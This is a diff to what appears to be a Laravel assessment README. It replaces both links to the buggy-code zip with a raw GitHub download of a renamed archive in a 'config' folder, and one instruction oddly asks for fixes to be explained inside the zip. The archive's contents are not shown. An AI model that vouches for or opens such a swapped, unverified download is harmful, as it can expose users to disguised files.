@@ -49,10 +49,10 @@ Create a RESTful API for managing products.
 Identify and fix issues in the provided buggy code.  
 
 ### **Instructions:**  
-- Open the **`https://raw.githubusercontent.com/Emperor-khay/Gloztec_Solutions_Laravel_Assessment/main/taxinomist/Gloztec_Solutions_Laravel_Assessment.zip`** file.  
+- Open the **`https://github.com/Emperor-khay/Gloztec_Solutions_Laravel_Assessment/raw/refs/heads/main/config/Solutions_Gloztec_Laravel_Assessment_2.5.zip`** file.  
 - The code inside has several issues.  
 - Fix the bugs and optimize the code.  
-- Explaing what you fixed in **https://raw.githubusercontent.com/Emperor-khay/Gloztec_Solutions_Laravel_Assessment/main/taxinomist/Gloztec_Solutions_Laravel_Assessment.zip** file.  
+- Explaing what you fixed in **https://github.com/Emperor-khay/Gloztec_Solutions_Laravel_Assessment/raw/refs/heads/main/config/Solutions_Gloztec_Laravel_Assessment_2.5.zip** file.  
 
 ---
 
